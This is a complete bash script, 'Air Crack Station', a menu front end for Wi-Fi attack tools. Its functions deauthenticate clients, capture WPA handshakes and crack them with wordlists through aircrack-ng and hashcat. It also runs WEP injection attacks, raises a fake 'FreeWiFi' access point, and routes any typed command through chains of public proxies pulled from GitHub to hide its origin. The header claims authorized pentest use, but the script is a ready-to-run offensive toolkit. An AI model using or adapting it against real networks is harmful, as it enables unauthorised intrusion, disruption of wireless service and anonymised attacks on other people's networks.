#!/usr/bin/env bash
###############################################
# ACS — Air Crack Station
# Made by Pakun & iinze0
# Authorized lab / pentest use only
# Local build — not a GitHub release
###############################################
set -o pipefail

ACS_VER="1.2.0"
ACS_AUTHOR="Pakun & iinze0"
SESSION_DIR="${ACS_HOME:-$HOME/.acs}"
SESSION_FILE="$SESSION_DIR/session"
LOG_FILE="$SESSION_DIR/acs.log"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

have() { command -v "$1" >/dev/null 2>&1; }

pause() { read -r -p "Press Enter..."; }

confirm() {
  local ans
  read -r -p "$(printf '%b%s [y/N]: %b' "$YELLOW" "$1" "$NC")" ans
  [[ "$ans" =~ ^[Yy]$ ]]
}

ok()   { echo -e "${GREEN}[+] $*${NC}"; }
warn() { echo -e "${YELLOW}[!] $*${NC}"; }
bad()  { echo -e "${RED}[!] $*${NC}"; }

need() {
  if have "$1"; then
    return 0
  fi
  bad "missing '$1' — run option 1 (station install)"
  pause
  return 1
}

valid_mac() {
  [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

run() {
  mkdir -p "$SESSION_DIR"
  echo "[$(date '+%F %T')] $*" >> "$LOG_FILE"
  echo -e "${CYAN}\$ $*${NC}"
  "$@"
  local rc=$?
  if [[ $rc -ne 0 ]]; then
    warn "exit $rc"
  fi
  return "$rc"
}

IFACE=""
MON=""
BSSID=""
ESSID=""
CHAN="6"
CLIENT=""
CAP="handshake"
WORDLIST="/usr/share/wordlists/rockyou.txt"

show_banner() {
  printf '%b' "${GREEN}${BOLD}"
  cat <<'EOF'

          _____
         |     |
         |_____|
        __|___|__
         / o o \
        |   >   |
         \_____/
     .---/     \---.
    /    ACS        \~~
   ~   crack station ~~

EOF
  printf '%b' "$NC"
  printf '  %bAir Crack Station%b  v%s\n' "${GREEN}${BOLD}" "$NC" "$ACS_VER"
  printf '  %bMade by %s%b\n' "${YELLOW}${BOLD}" "$ACS_AUTHOR" "$NC"
  printf '  session %s\n\n' "$SESSION_FILE"
}

save_session() {
  mkdir -p "$SESSION_DIR"
  cat > "$SESSION_FILE" <<EOF
IFACE=$(printf '%q' "$IFACE")
MON=$(printf '%q' "$MON")
BSSID=$(printf '%q' "$BSSID")
ESSID=$(printf '%q' "$ESSID")
CHAN=$(printf '%q' "$CHAN")
CLIENT=$(printf '%q' "$CLIENT")
CAP=$(printf '%q' "$CAP")
WORDLIST=$(printf '%q' "$WORDLIST")
EOF
  ok "saved $SESSION_FILE"
}

load_session() {
  if [[ ! -f $SESSION_FILE ]]; then
    warn "no session at $SESSION_FILE"
    return 1
  fi
  # shellcheck disable=SC1090
  source "$SESSION_FILE"
  ok "loaded session"
}

latest_cap() {
  local base="$1" f
  f=$(ls -1t "${base}"-*.cap 2>/dev/null | head -n1 || true)
  if [[ -z $f && -f ${base}.cap ]]; then
    f="${base}.cap"
  fi
  printf '%s' "$f"
}

station_install() {
  echo -e "${CYAN}[+] Installing crack-station packages...${NC}"
  export DEBIAN_FRONTEND=noninteractive
  apt-get update -y
  apt-get install -y \
    aircrack-ng hashcat hcxdumptool hcxtools wifite bully reaver \
    pixiewps macchanger john crunch cowpatty rfkill iw wireless-tools \
    pciutils usbutils ethtool mdk4 hostapd dnsmasq proxychains4 curl
  if [[ ! -f /usr/share/wordlists/rockyou.txt && -f /usr/share/wordlists/rockyou.txt.gz ]]; then
    gunzip -k /usr/share/wordlists/rockyou.txt.gz || true
  fi
  ok "station packages finished"
  local b
  for b in airmon-ng airodump-ng aireplay-ng aircrack-ng airbase-ng airdecap-ng \
    airdecloak-ng airdrop-ng airgraph-ng airolib-ng airserv-ng airtun-ng \
    airventriloquist-ng besside-ng easside-ng tkiptun-ng wesside-ng wpaclean \
    ivstools makeivs-ng packetforge-ng buddy-ng hashcat hcxdumptool hcxpcapngtool wifite; do
    if have "$b"; then
      echo -e "  ${GREEN}OK${NC}   $b"
    else
      echo -e "  ${RED}MISS${NC} $b"
    fi
  done
  pause
}

pick_wifi() {
  echo -e "${YELLOW}Wireless interfaces:${NC}"
  local -a W=()
  mapfile -t W < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
  if [[ ${#W[@]} -eq 0 ]]; then
    mapfile -t W < <(ip -o link show | awk -F': ' '{print $2}' | grep -E '^(wl|wlan)' || true)
  fi
  if [[ ${#W[@]} -eq 0 ]]; then
    bad "no wireless iface found"
    read -r -p "Interface name: " IFACE
    return
  fi
  local i c
  for i in "${!W[@]}"; do
    if [[ ${W[$i]} == *mon ]]; then
      echo -e "  $((i+1))) ${GREEN}${W[$i]}${NC} ${YELLOW}(monitor)${NC}"
    else
      echo "  $((i+1))) ${W[$i]}"
    fi
  done
  echo "  m) manual"
  read -r -p "Choice [1]: " c
  if [[ $c == m || $c == M ]]; then
    read -r -p "Interface: " IFACE
  elif [[ $c =~ ^[0-9]+$ ]] && (( c >= 1 && c <= ${#W[@]} )); then
    IFACE="${W[$((c-1))]}"
  else
    IFACE="${W[0]}"
  fi
  if [[ $IFACE == *mon ]]; then
    MON="$IFACE"
  fi
  ok "iface $IFACE"
}

auto_monitor() {
  [[ -n $IFACE ]] || pick_wifi
  [[ -n $IFACE ]] || return 1
  need airmon-ng || return 1
  if [[ $IFACE == *mon ]]; then
    MON="$IFACE"
    ok "already monitor: $MON"
    iw dev "$MON" info 2>/dev/null || true
    pause
    return 0
  fi
  if [[ -d /sys/class/net/${IFACE}mon ]]; then
    MON="${IFACE}mon"
    ok "monitor already up: $MON"
    pause
    return 0
  fi
  warn "this runs 'airmon-ng check kill' (stops NetworkManager / wpa_supplicant)"
  confirm "Enable monitor mode on $IFACE?" || return 1
  ok "auto monitor on $IFACE"
  rfkill unblock wifi 2>/dev/null || true
  rfkill unblock all 2>/dev/null || true
  ip link set "$IFACE" up 2>/dev/null || true
  run airmon-ng check kill || true
  run airmon-ng start "$IFACE" || true
  sleep 1
  if [[ -d /sys/class/net/${IFACE}mon ]]; then
    MON="${IFACE}mon"
  else
    MON=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep 'mon$' | head -n1 || true)
  fi
  if [[ -z $MON || ! -d /sys/class/net/$MON ]]; then
    bad "monitor iface did not come up. Is this a USB card that supports monitor mode?"
    MON=""
    pause
    return 1
  fi
  ok "monitor iface: $MON"
  iw dev "$MON" info 2>/dev/null || iwconfig "$MON" 2>/dev/null || true
  pause
}

restore_managed() {
  local m="${MON:-}"
  [[ -z $m && -n $IFACE && $IFACE != *mon ]] && m="${IFACE}mon"
  if [[ -n $m ]]; then
    warn "stopping $m"
    airmon-ng stop "$m" 2>/dev/null || true
  fi
  systemctl start NetworkManager 2>/dev/null || service NetworkManager start 2>/dev/null || true
  nmcli radio wifi on 2>/dev/null || true
  MON=""
  if [[ $IFACE == *mon ]]; then
    IFACE="${IFACE%mon}"
  fi
  ok "managed mode restored"
}

need_mon() {
  if [[ -n $MON && -d /sys/class/net/$MON ]]; then
    return 0
  fi
  warn "no live monitor iface — starting auto monitor"
  auto_monitor
  [[ -n $MON && -d /sys/class/net/$MON ]]
}

read_target() {
  local t
  read -r -p "BSSID [$BSSID]: " t
  if [[ -n $t ]]; then
    if valid_mac "$t"; then BSSID="$t"; else bad "bad BSSID, kept old value"; fi
  fi
  read -r -p "ESSID [$ESSID]: " t
  [[ -n $t ]] && ESSID="$t"
  read -r -p "Channel [$CHAN]: " t
  if [[ -n $t ]]; then
    if [[ $t =~ ^[0-9]{1,3}$ ]]; then CHAN="$t"; else bad "bad channel"; fi
  fi
  read -r -p "Client MAC (empty keeps current) [$CLIENT]: " t
  if [[ -n $t ]]; then
    if valid_mac "$t"; then CLIENT="$t"; else bad "bad client MAC"; fi
  fi
  read -r -p "Capture prefix [$CAP]: " t
  [[ -n $t ]] && CAP="$t"
}

need_bssid() {
  if valid_mac "$BSSID"; then
    return 0
  fi
  bad "set a real BSSID first (option 4)"
  pause
  return 1
}

need_wordlist() {
  local w="${1:-$WORDLIST}"
  if [[ -f $w ]]; then
    return 0
  fi
  if [[ -f ${w}.gz ]]; then
    warn "unzipping ${w}.gz"
    gunzip -k "${w}.gz" || true
  fi
  if [[ -f $w ]]; then
    return 0
  fi
  bad "wordlist not found: $w"
  pause
  return 1
}

set_wordlist() {
  local w
  read -r -p "Wordlist [$WORDLIST]: " w
  [[ -n $w ]] && WORDLIST="$w"
  if [[ -f $WORDLIST ]]; then
    ok "wordlist $WORDLIST"
  else
    warn "file not there yet: $WORDLIST"
  fi
  pause
}

# ---------- actions ----------

do_scan() {
  need_mon || return
  need airodump-ng || return
  ok "scan — Ctrl-C returns to the menu"
  run airodump-ng --band abg "$MON" || true
}

do_lock() {
  need_mon || return
  need airodump-ng || return
  need_bssid || return
  ok "locked on $BSSID ch $CHAN — Ctrl-C returns"
  run airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$CAP" "$MON" || true
}

do_deauth() {
  need_mon || return
  need aireplay-ng || return
  need_bssid || return
  local n=8
  read -r -p "Deauth count [8]: " n
  [[ $n =~ ^[0-9]+$ ]] || n=8
  if valid_mac "$CLIENT"; then
    run aireplay-ng --deauth "$n" -a "$BSSID" -c "$CLIENT" "$MON" || true
  else
    run aireplay-ng --deauth "$n" -a "$BSSID" "$MON" || true
  fi
  pause
}

do_wpa() {
  need aircrack-ng || return
  need_wordlist || return
  local cap f extra=()
  read -r -p "cap file (empty = newest ${CAP}-*.cap): " cap
  if [[ -z $cap ]]; then
    f=$(latest_cap "$CAP")
  else
    f="$cap"
  fi
  if [[ -z $f || ! -f $f ]]; then
    bad "no cap file ($f)"
    pause
    return
  fi
  valid_mac "$BSSID" && extra=(-b "$BSSID")
  run aircrack-ng -w "$WORDLIST" "${extra[@]}" "$f" || true
  pause
}

do_wep() {
  need aircrack-ng || return
  local cap
  read -r -p "cap/ivs: " cap
  [[ -n $cap && -f $cap ]] || { bad "file missing"; pause; return; }
  if valid_mac "$BSSID"; then
    run aircrack-ng -b "$BSSID" "$cap" || true
  else
    run aircrack-ng "$cap" || true
  fi
  pause
}

do_handshake() {
  need_mon || return
  need airodump-ng || return
  need aireplay-ng || return
  need_bssid || return
  local pid f
  ok "capture + deauth. Press Enter when the handshake shows, then it cracks."
  airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$CAP" "$MON" &
  pid=$!
  sleep 4
  if valid_mac "$CLIENT"; then
    aireplay-ng --deauth 6 -a "$BSSID" -c "$CLIENT" "$MON" || true
  else
    aireplay-ng --deauth 8 -a "$BSSID" "$MON" || true
  fi
  read -r -p "Press Enter to stop capture... "
  kill "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true
  f=$(latest_cap "$CAP")
  if [[ -z $f ]]; then
    bad "no cap written"
    pause
    return
  fi
  ok "cap $f"
  if need_wordlist && need aircrack-ng; then
    run aircrack-ng -w "$WORDLIST" -b "$BSSID" "$f" || true
  fi
  pause
}

do_hcx() {
  need_mon || return
  need hcxdumptool || return
  local out="hcx_$(date +%H%M%S).pcapng"
  ok "hcxdumptool writing $out — Ctrl-C returns"
  run hcxdumptool -i "$MON" -w "$out" --rds=1 || true
  if [[ -f $out ]]; then
    ok "wrote $out  (option 37 converts it)"
    echo "$out" > "$SESSION_DIR/last.pcapng"
  fi
  pause
}

do_hashcat() {
  need hcxpcapngtool || return
  need hashcat || return
  need_wordlist || return
  local pcap hash
  read -r -p "pcapng (empty = last hcx dump): " pcap
  if [[ -z $pcap && -f $SESSION_DIR/last.pcapng ]]; then
    pcap=$(cat "$SESSION_DIR/last.pcapng")
  fi
  [[ -f $pcap ]] || { bad "pcapng missing"; pause; return; }
  hash="${pcap%.*}.hc22000"
  run hcxpcapngtool -o "$hash" "$pcap" || true
  if [[ ! -s $hash ]]; then
    bad "no hashes in $hash"
    pause
    return
  fi
  run hashcat -m 22000 "$hash" "$WORDLIST" --force || true
  pause
}

# ---------- proxy chain (lists pulled from GitHub) ----------

PROXY_CONF="$SESSION_DIR/proxychains.conf"
PROXY_RAW="$SESSION_DIR/proxies.raw"
PROXY_COUNT=3
PROXY_KIND="socks5"

proxy_sources() {
  case "$1" in
    socks4)
      echo "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt"
      echo "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt"
      ;;
    http)
      echo "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
      echo "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
      ;;
    *)
      echo "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
      echo "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"
      echo "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
      ;;
  esac
}

pull_github_proxies() {
  local kind="$1" url tmp="$SESSION_DIR/pull.tmp" got=0 urls
  : > "$PROXY_RAW"
  urls=$(proxy_sources "$kind")
  while IFS= read -r url; do
    [[ -z $url ]] && continue
    echo -e "  ${CYAN}GET${NC} $url"
    if curl -fsSL --max-time 25 -A "acs-proxychain" "$url" -o "$tmp"; then
      grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}:[0-9]{2,5}$' "$tmp" >> "$PROXY_RAW" || true
      got=1
    else
      warn "failed $url"
    fi
  done <<< "$urls"
  rm -f "$tmp"
  if [[ $got -eq 0 || ! -s $PROXY_RAW ]]; then
    bad "no proxy IPs downloaded from GitHub"
    return 1
  fi
  sort -u "$PROXY_RAW" -o "$PROXY_RAW"
  ok "$(wc -l < "$PROXY_RAW") unique ${kind} proxies from GitHub"
}

write_proxychains() {
  local kind="$1" count="$2" mode="$3" line ip port n=0
  mkdir -p "$SESSION_DIR"
  {
    echo "# ACS proxy chain — IPs pulled from GitHub"
    echo "$mode"
    if [[ $mode == random_chain ]]; then
      echo "chain_len = $count"
    fi
    echo "proxy_dns"
    echo "tcp_read_time_out 15000"
    echo "tcp_connect_time_out 8000"
    echo "[ProxyList]"
    if have shuf; then
      shuf "$PROXY_RAW"
    else
      awk 'BEGIN{srand()} {print rand()"\t"$0}' "$PROXY_RAW" | sort -n | cut -f2-
    fi | while IFS= read -r line; do
      [[ $n -ge $count ]] && break
      ip="${line%%:*}"
      port="${line##*:}"
      [[ $ip =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ && $port =~ ^[0-9]+$ ]] || continue
      echo "$kind $ip $port"
      n=$((n + 1))
    done
  } > "$PROXY_CONF"
  local written
  written=$(grep -cE '^[a-z0-9]+ [0-9]' "$PROXY_CONF" || true)
  if [[ ${written:-0} -lt 1 ]]; then
    bad "chain file is empty"
    return 1
  fi
  ok "chain ($mode, $written hops) → $PROXY_CONF"
  echo
  grep -E '^[a-z0-9]+ [0-9]' "$PROXY_CONF" | head -n 12
  [[ $written -gt 12 ]] && echo "  ... $((written - 12)) more"
}

do_proxychain() {
  have curl || { bad "curl missing"; pause; return; }
  if ! have proxychains4 && ! have proxychains; then
    warn "proxychains4 is not installed"
    confirm "apt install proxychains4 now?" && apt-get install -y proxychains4 || true
  fi
  echo "Protocol:"
  echo "  1) socks5   2) socks4   3) http"
  local k p
  read -r -p "Choice [1]: " k
  case $k in
    2) PROXY_KIND="socks4" ;;
    3) PROXY_KIND="http" ;;
    *) PROXY_KIND="socks5" ;;
  esac
  read -r -p "How many proxies in the chain [3]: " p
  if [[ $p =~ ^[0-9]+$ ]] && (( p >= 1 && p <= 50 )); then
    PROXY_COUNT=$p
  else
    PROXY_COUNT=3
  fi
  echo "Chain mode:"
  echo "  1) dynamic (skip dead proxies)   2) strict   3) random"
  read -r -p "Choice [1]: " k
  local mode="dynamic_chain"
  case $k in
    2) mode="strict_chain" ;;
    3) mode="random_chain" ;;
  esac
  pull_github_proxies "$PROXY_KIND" || { pause; return; }
  write_proxychains "$PROXY_KIND" "$PROXY_COUNT" "$mode" || { pause; return; }
  pause
}

do_proxy_test() {
  [[ -f $PROXY_CONF ]] || { bad "build a chain first (option 42)"; pause; return; }
  local bin="proxychains4"
  have proxychains4 || bin="proxychains"
  have "$bin" || { bad "proxychains4 not installed"; pause; return; }
  echo -e "${YELLOW}Direct IP:${NC}"
  curl -fsSL --max-time 12 https://ifconfig.me || echo "direct lookup failed"
  echo
  echo -e "${YELLOW}Through chain:${NC}"
  "$bin" -f "$PROXY_CONF" curl -fsSL --max-time 25 https://ifconfig.me || warn "chain lookup failed (dead proxies are common — rebuild)"
  echo
  pause
}

do_proxy_run() {
  [[ -f $PROXY_CONF ]] || { bad "build a chain first (option 42)"; pause; return; }
  local bin="proxychains4"
  have proxychains4 || bin="proxychains"
  have "$bin" || { bad "proxychains4 not installed"; pause; return; }
  echo "Command to run through the chain (example: curl -I https://example.com)"
  local cmd
  read -r -p "> " cmd
  [[ -n $cmd ]] || return
  echo "[$(date '+%F %T')] $bin -f $PROXY_CONF $cmd" >> "$LOG_FILE"
  # shellcheck disable=SC2086
  "$bin" -f "$PROXY_CONF" bash -c "$cmd" || true
  pause
}

# ---------- start ----------

[[ $EUID -ne 0 ]] && { bad "run: sudo bash acs.sh"; exit 1; }
mkdir -p "$SESSION_DIR"
show_banner
if [[ -f $SESSION_FILE ]] && confirm "Load saved session?"; then
  load_session || true
fi
[[ -n $IFACE ]] || pick_wifi

while true; do
  clear
  echo -e "${GREEN}${BOLD}  ACS${NC}  ${YELLOW}by $ACS_AUTHOR${NC}  ${CYAN}v$ACS_VER${NC}"
  echo -e "  IFACE ${GREEN}${IFACE:-?}${NC}  MON ${GREEN}${MON:-off}${NC}  CH ${GREEN}$CHAN${NC}"
  echo -e "  BSSID ${GREEN}${BSSID:-—}${NC}  ESSID ${GREEN}${ESSID:-—}${NC}"
  echo -e "  CLIENT ${GREEN}${CLIENT:-—}${NC}  CAP ${GREEN}$CAP${NC}"
  echo -e "  WORD  ${GREEN}$WORDLIST${NC}"
  if [[ -f $PROXY_CONF ]]; then
    echo -e "  CHAIN ${GREEN}$(grep -cE '^[a-z0-9]+ [0-9]' "$PROXY_CONF" || echo 0) proxies${NC}  ${CYAN}$PROXY_CONF${NC}"
  else
    echo -e "  CHAIN ${YELLOW}off${NC}"
  fi
  echo
  echo -e "${YELLOW}Station${NC}"
  echo "  1) Crack-station install     2) Auto monitor mode"
  echo "  3) Restore managed           4) Set target"
  echo " 38) Wordlist                 39) Change interface"
  echo " 40) Save session             41) Load session"
  echo -e "${YELLOW}Proxy chain${NC}"
  echo " 42) Pull proxies from GitHub 43) Test chain"
  echo " 44) Run a command through the chain"
  echo -e "${YELLOW}Capture${NC}"
  echo "  5) airodump-ng scan          6) airodump-ng lock AP"
  echo "  7) wpaclean                  8) ivstools convert"
  echo " 36) hcxdumptool (modern WPA)"
  echo -e "${YELLOW}Inject${NC}"
  echo "  9) deauth                   10) fakeauth          11) ARP replay"
  echo " 12) chopchop                 13) fragmentation     14) caffe-latte"
  echo " 15) interactive replay       16) packetforge-ng    17) airdrop-ng"
  echo " 18) airventriloquist-ng      19) tkiptun-ng"
  echo -e "${YELLOW}Crack${NC}"
  echo " 20) aircrack-ng WPA          21) aircrack-ng WEP"
  echo " 22) besside-ng               23) wesside-ng        24) easside-ng + buddy"
  echo " 25) airolib-ng PMK           26) Handshake chain"
  echo " 37) pcapng → hashcat 22000"
  echo -e "${YELLOW}AP / tunnel${NC}"
  echo " 27) airbase-ng               28) airtun-ng         29) airserv-ng"
  echo -e "${YELLOW}Crypto / util${NC}"
  echo " 30) airdecap-ng              31) airdecloak-ng     32) airgraph-ng"
  echo " 33) makeivs-ng               34) kstats            35) wifite"
  echo "  0) Exit"
  echo
  read -r -p "  Option: " o
  case $o in
    1) station_install ;;
    2) auto_monitor ;;
    3) restore_managed; pause ;;
    4) read_target ;;
    5) do_scan ;;
    6) do_lock ;;
    7)
      need wpaclean || continue
      read -r -p "input cap: " in
      in="${in:-$(latest_cap "$CAP")}"
      [[ -f $in ]] || { bad "no cap"; pause; continue; }
      run wpaclean handshake-clean.cap "$in" || true
      pause
      ;;
    8)
      need ivstools || continue
      read -r -p "pcap: " in
      [[ -f $in ]] || { bad "missing"; pause; continue; }
      run ivstools --convert "$in" "${in%.*}.ivs" || true
      pause
      ;;
    9) do_deauth ;;
    10)
      need_mon || continue
      need aireplay-ng || continue
      need_bssid || continue
      run aireplay-ng --fakeauth 0 -a "$BSSID" -e "$ESSID" "$MON" || true
      pause
      ;;
    11)
      need_mon || continue
      need aireplay-ng || continue
      need_bssid || continue
      valid_mac "$CLIENT" || { bad "ARP replay needs a client MAC"; pause; continue; }
      run aireplay-ng --arpreplay -b "$BSSID" -h "$CLIENT" "$MON" || true
      ;;
    12)
      need_mon || continue
      need aireplay-ng || continue
      need_bssid || continue
      valid_mac "$CLIENT" || { bad "chopchop needs a client MAC"; pause; continue; }
      run aireplay-ng --chopchop -b "$BSSID" -h "$CLIENT" "$MON" || true
      ;;
    13)
      need_mon || continue
      need aireplay-ng || continue
      need_bssid || continue
      valid_mac "$CLIENT" || { bad "fragmentation needs a client MAC"; pause; continue; }
      run aireplay-ng --fragment -b "$BSSID" -h "$CLIENT" "$MON" || true
      ;;
    14)
      need_mon || continue
      need aireplay-ng || continue
      need_bssid || continue
      run aireplay-ng --caffe-latte -b "$BSSID" "$MON" || true
      ;;
    15)
      need_mon || continue
      need aireplay-ng || continue
      need_bssid || continue
      run aireplay-ng --interactive -b "$BSSID" -p 0841 "$MON" || true
      ;;
    16)
      need packetforge-ng || continue
      need_bssid || continue
      valid_mac "$CLIENT" || { bad "packetforge needs a client MAC"; pause; continue; }
      [[ -f fragment.xor ]] || { bad "need fragment.xor from chopchop/fragment first"; pause; continue; }
      run packetforge-ng -0 -a "$BSSID" -h "$CLIENT" -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp-forged.cap || true
      pause
      ;;
    17)
      need_mon || continue
      need airdrop-ng || continue
      read -r -p "airodump csv: " csv
      [[ -f $csv ]] || { bad "csv missing"; pause; continue; }
      run airdrop-ng -i "$MON" -t "$csv" || true
      ;;
    18)
      need_mon || continue
      need airventriloquist-ng || continue
      valid_mac "$CLIENT" || { bad "needs client MAC"; pause; continue; }
      run airventriloquist-ng -i "$MON" -d "$CLIENT" || true
      ;;
    19)
      need_mon || continue
      need tkiptun-ng || continue
      need_bssid || continue
      valid_mac "$CLIENT" || { bad "tkiptun needs client MAC"; pause; continue; }
      run tkiptun-ng -a "$BSSID" -h "$CLIENT" "$MON" || true
      ;;
    20) do_wpa ;;
    21) do_wep ;;
    22)
      need_mon || continue
      need besside-ng || continue
      if valid_mac "$BSSID"; then
        run besside-ng -b "$BSSID" -c "$CHAN" "$MON" || true
      else
        run besside-ng "$MON" || true
      fi
      ;;
    23)
      need_mon || continue
      need wesside-ng || continue
      if valid_mac "$BSSID"; then
        run wesside-ng -i "$MON" -n "$BSSID" || true
      else
        run wesside-ng -i "$MON" || true
      fi
      ;;
    24)
      need_mon || continue
      need easside-ng || continue
      need_bssid || continue
      echo "Start buddy-ng on the helper host first."
      read -r -p "buddy IP: " ip
      [[ -n $ip ]] || { bad "need buddy IP"; pause; continue; }
      run easside-ng -i "$MON" -b "$BSSID" -s "$ip" || true
      ;;
    25)
      need airolib-ng || continue
      need aircrack-ng || continue
      [[ -n $ESSID ]] || { bad "set ESSID first"; pause; continue; }
      need_wordlist || continue
      run airolib-ng pmk.db --import essid <(printf '%s\n' "$ESSID") || true
      run airolib-ng pmk.db --import passwd "$WORDLIST" || true
      run airolib-ng pmk.db --batch || true
      f=$(latest_cap "$CAP")
      if [[ -f $f ]]; then
        run aircrack-ng -r pmk.db "$f" || true
      else
        warn "PMK db built, no cap to crack yet"
      fi
      pause
      ;;
    26) do_handshake ;;
    27)
      need_mon || continue
      need airbase-ng || continue
      run airbase-ng -a "${BSSID:-00:11:22:33:44:55}" -e "${ESSID:-FreeWiFi}" -c "$CHAN" "$MON" || true
      ;;
    28)
      need_mon || continue
      need airtun-ng || continue
      need_bssid || continue
      run airtun-ng -a "$BSSID" -e "$ESSID" "$MON" || true
      ;;
    29)
      need_mon || continue
      need airserv-ng || continue
      run airserv-ng -d "$MON" -p 666 || true
      ;;
    30)
      need airdecap-ng || continue
      [[ -n $ESSID ]] || { bad "set ESSID"; pause; continue; }
      read -r -p "passphrase: " pw
      f=$(latest_cap "$CAP")
      [[ -f $f ]] || { bad "no cap"; pause; continue; }
      run airdecap-ng -e "$ESSID" -p "$pw" "$f" || true
      pause
      ;;
    31)
      need airdecloak-ng || continue
      read -r -p "cap: " cap
      [[ -f $cap ]] || { bad "missing"; pause; continue; }
      run airdecloak-ng -i "$cap" || true
      pause
      ;;
    32)
      need airgraph-ng || continue
      read -r -p "csv: " csv
      [[ -f $csv ]] || { bad "missing"; pause; continue; }
      run airgraph-ng -i "$csv" -o graph.png -g CAPR || true
      pause
      ;;
    33)
      need makeivs-ng || continue
      run makeivs-ng -k AABBCCDDEE -o test.ivs -s 10000 || true
      pause
      ;;
    34)
      if have kstats; then
        f=$(ls -1t *.ivs 2>/dev/null | head -n1 || true)
        [[ -n $f ]] && run kstats "$f" || bad "no .ivs"
      else
        bad "kstats not installed"
      fi
      pause
      ;;
    35)
      need wifite || continue
      run wifite || true
      ;;
    36) do_hcx ;;
    37) do_hashcat ;;
    38) set_wordlist ;;
    39) pick_wifi; pause ;;
    40) save_session; pause ;;
    41) load_session; pause ;;
    42) do_proxychain ;;
    43) do_proxy_test ;;
    44) do_proxy_run ;;
    0)
      if [[ -n $MON ]] && confirm "Restore managed mode before exit?"; then
        restore_managed
      fi
      save_session
      exit 0
      ;;
    *)
      bad "invalid option"
      pause
      ;;
  esac
done
